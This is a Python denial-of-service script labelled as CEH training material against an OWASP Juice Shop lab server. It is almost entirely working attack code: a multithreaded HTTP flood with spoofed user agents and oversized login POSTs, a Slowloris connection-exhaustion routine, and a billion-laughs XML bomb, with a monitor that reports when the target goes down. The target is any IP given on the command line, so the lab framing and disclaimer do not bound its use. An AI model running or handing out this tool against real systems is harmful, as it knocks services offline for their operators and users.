#!/usr/bin/env python3
"""
Cross-Machine DoS Attack Script for CEH Training
Target: OWASP Juice Shop on Ubuntu (remote)
Attacker: Kali Linux
Educational Purposes ONLY - Authorized testing only!
"""

import requests
import threading
import time
import socket
import random
import sys
import signal
from urllib.parse import urljoin
import argparse
from datetime import datetime

# Color codes for better terminal output (Kali friendly)
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
RESET = '\033[0m'

class CrossMachineDoSAttack:
    def __init__(self, target_ip, target_port=3000, threads=500, attack_duration=None):
        self.target_url = f"http://{target_ip}:{target_port}"
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.attack_duration = attack_duration  # Attack time limit in seconds
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        self.running = True
        self.start_time = None
        
        # More realistic attack vectors for Juice Shop
        self.attack_paths = [
            "/",
            "/rest/products/search?q=",
            "/rest/products/search?q=apple",
            "/rest/products/1/reviews",
            "/rest/basket/1",
            "/rest/track-order/",
            "/rest/user/whoami",
            "/rest/user/login",
            "/rest/user/register",
            "/rest/products/1",
            "/rest/basket/1/items",
            "/rest/complaint",
            "/rest/captcha/",
            "/rest/feedback",
            "/#/search",
            "/#/login",
            "/#/register",
            "/#/contact",
            "/#/about",
            "/assets/public/images/products/apple_juice.jpg",
            "/assets/public/images/products/lemon_juice.jpg",
            "/api-docs",
            "/metrics",
            "/ftp/",
            "/sitemap.xml",
            "/robots.txt"
        ]
        
        # Realistic user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "curl/7.81.0",
            "python-requests/2.31.0"
        ]
        
    def print_banner(self):
        """Display attack banner"""
        banner = f"""
{RED}{'='*70}{RESET}
{PURPLE}🔴 OWASP Juice Shop DoS Attack - CEH Training{RESET}
{RED}{'='*70}{RESET}
{YELLOW}📡 Target:{RESET} {self.target_url}
{YELLOW}💻 Attacker:{RESET} Kali Linux
{YELLOW}⚡ Threads:{RESET} {self.threads}
{YELLOW}⏱️  Duration:{RESET} {'Unlimited' if not self.attack_duration else f'{self.attack_duration} seconds'}
{RED}{'='*70}{RESET}
        """
        print(banner)
    
    def syn_flood_simulation(self):
        """Simulate SYN flood using raw sockets (requires root)"""
        try:
            # This creates multiple half-open connections
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            # Try to connect but don't complete handshake properly
            sock.connect((self.target_ip, self.target_port))
            # Send partial data then keep connection hanging
            sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n")
            
            # Keep connection open without completing
            for _ in range(20):
                if not self.running:
                    break
                sock.send(b"X-KeepAlive: dummy\r\n")
                time.sleep(0.1)
            
            sock.close()
        except:
            pass
    
    def http_flood(self, path):
        """Standard HTTP flood with realistic headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        counter = 0
        while self.running and (not self.attack_duration or (time.time() - self.start_time) < self.attack_duration):
            try:
                # Alternate between GET and POST
                if random.choice([True, False, False]):  # 2/3 GET, 1/3 POST
                    url = urljoin(self.target_url, path)
                    response = requests.get(url, headers=headers, timeout=3)
                else:
                    # POST to login or registration endpoints
                    url = urljoin(self.target_url, "/rest/user/login")
                    fake_data = {
                        "email": f"attacker{random.randint(1,999999)}@test.com",
                        "password": "A" * random.randint(50, 500)
                    }
                    response = requests.post(url, json=fake_data, headers=headers, timeout=3)
                
                with self.lock:
                    self.success_count += 1
                    if self.success_count % 100 == 0:
                        self.print_status()
                
                # Variable delay to appear more legitimate
                time.sleep(random.uniform(0.0001, 0.005))
                
            except requests.exceptions.ConnectionError:
                with self.lock:
                    self.fail_count += 1
                # Server might be struggling - slow down slightly
                time.sleep(0.01)
            except requests.exceptions.Timeout:
                with self.lock:
                    self.fail_count += 1
            except Exception:
                pass
            
            counter += 1
    
    def slowloris_attack(self):
        """Slowloris - keep many connections open"""
        while self.running and (not self.attack_duration or (time.time() - self.start_time) < self.attack_duration):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request
                partial_request = f"GET / HTTP/1.1\r\n"
                partial_request += f"Host: {self.target_ip}\r\n"
                partial_request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                partial_request += "Content-Length: 10000\r\n"
                partial_request += f"X-Custom-{random.randint(1,9999)}: " + "A" * random.randint(100, 1000) + "\r\n"
                
                sock.send(partial_request.encode())
                
                # Slowly send more headers
                for _ in range(random.randint(10, 50)):
                    if not self.running:
                        break
                    sock.send(f"X-KeepAlive: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(random.uniform(0.5, 3))
                
                sock.close()
                
            except:
                time.sleep(0.5)
    
    def xml_bomb_attack(self):
        """Attempt XXE or XML bomb if endpoints accept XML"""
        xml_bomb = '<?xml version="1.0"?>' + \
                   '<!DOCTYPE lolz [' + \
                   '<!ENTITY lol "lol">' + \
                   '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' + \
                   '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">' + \
                   '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' + \
                   ']>' + \
                   '<lolz>&lol3;</lolz>'
        
        headers = {'Content-Type': 'application/xml', 'User-Agent': random.choice(self.user_agents)}
        
        while self.running and (not self.attack_duration or (time.time() - self.start_time) < self.attack_duration):
            try:
                requests.post(self.target_url + "/rest/products/reviews", 
                            data=xml_bomb, 
                            headers=headers, 
                            timeout=2)
            except:
                pass
            time.sleep(0.1)
    
    def print_status(self):
        """Display real-time attack status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        total = self.success_count + self.fail_count
        success_rate = (self.success_count / total * 100) if total > 0 else 0
        
        status_msg = f"\r{GREEN}[{elapsed:.0f}s]{RESET} " \
                    f"✅ Success: {self.success_count} " \
                    f"{RED}❌ Failed: {self.fail_count}{RESET} " \
                    f"📊 Rate: {success_rate:.1f}%     "
        
        sys.stdout.write(status_msg)
        sys.stdout.flush()
    
    def test_server_status(self):
        """Check if server is still responding"""
        try:
            response = requests.get(f"{self.target_url}/", timeout=2)
            if response.status_code == 200:
                return True
        except:
            return False
        return False
    
    def monitor_server(self):
        """Monitor server health during attack"""
        last_status = True
        while self.running:
            time.sleep(5)
            is_alive = self.test_server_status()
            
            if not is_alive and last_status:
                print(f"\n{RED}💀 TARGET IS DOWN! Attack successful! 💀{RESET}")
            elif is_alive and not last_status:
                print(f"\n{GREEN}🟢 Target recovered{RESET}")
            
            last_status = is_alive
    
    def run_attack(self):
        """Launch all attack vectors"""
        self.print_banner()
        self.start_time = time.time()
        
        confirm = input(f"{YELLOW}⚠️  Confirm attack on {self.target_url}? (type 'attack' to continue): {RESET}")
        if confirm.lower() != 'attack':
            print("Attack aborted.")
            return
        
        print(f"\n{BLUE}🚀 Launching attack with {self.threads} threads...{RESET}\n")
        
        threads = []
        
        # Launch HTTP flood threads (70% of threads)
        flood_threads = int(self.threads * 0.7)
        for i in range(flood_threads):
            path = random.choice(self.attack_paths)
            t = threading.Thread(target=self.http_flood, args=(path,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Launch Slowloris threads (20% of threads)
        slowloris_threads = int(self.threads * 0.2)
        for i in range(slowloris_threads):
            t = threading.Thread(target=self.slowloris_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Launch XML bomb threads (10% of threads)
        xml_threads = self.threads - flood_threads - slowloris_threads
        for i in range(xml_threads):
            t = threading.Thread(target=self.xml_bomb_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_server)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            # Wait for attack duration if specified
            if self.attack_duration:
                time.sleep(self.attack_duration)
                self.running = False
                print(f"\n\n{YELLOW}⏰ Attack duration completed{RESET}")
            else:
                # Wait for Ctrl+C
                while self.running:
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}🛑 Attack stopped by user{RESET}")
            self.running = False
        
        # Wait for threads to finish
        time.sleep(2)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{PURPLE}📊 FINAL ATTACK STATISTICS{RESET}")
        print(f"{RED}{'='*70}{RESET}")
        print(f"⏱️  Duration: {elapsed:.1f} seconds")
        print(f"✅ Successful requests: {self.success_count}")
        print(f"❌ Failed requests: {self.fail_count}")
        print(f"📈 Total requests: {self.success_count + self.fail_count}")
        print(f"🚀 Avg requests/sec: {(self.success_count + self.fail_count) / elapsed:.1f}")
        
        # Final server status
        print(f"\n{YELLOW}🔍 Checking final server status...{RESET}")
        time.sleep(2)
        if self.test_server_status():
            print(f"{GREEN}✅ Server is still responding{RESET}")
        else:
            print(f"{RED}💀 Server is DOWN or unresponsive{RESET}")
        
        print(f"\n{BLUE}💡 CEH Tip: This demonstrates why rate limiting, WAFs, and CDNs are essential{RESET}")

def main():
    parser = argparse.ArgumentParser(description='CEH Training - DoS Attack on OWASP Juice Shop')
    parser.add_argument('-t', '--target', required=True, help='Target Ubuntu IP address')
    parser.add_argument('-p', '--port', type=int, default=3000, help='Juice Shop port (default: 3000)')
    parser.add_argument('-th', '--threads', type=int, default=500, help='Number of threads (default: 500)')
    parser.add_argument('-d', '--duration', type=int, help='Attack duration in seconds (optional)')
    
    args = parser.parse_args()
    
    # Validate target
    if args.target in ['localhost', '127.0.0.1']:
        print(f"{RED}Error: Target is localhost. This script is designed for cross-machine attacks!{RESET}")
        print("Use the IP address of your Ubuntu machine instead.")
        sys.exit(1)
    
    # Create and run attack
    attacker = CrossMachineDoSAttack(
        target_ip=args.target,
        target_port=args.port,
        threads=args.threads,
        attack_duration=args.duration
    )
    
    attacker.run_attack()

if __name__ == "__main__":
    # Check for root (required for some attack vectors)
    if not hasattr(socket, 'socket'):
        print("Some features may require root privileges. Run with 'sudo' for full functionality.")
    
    main()
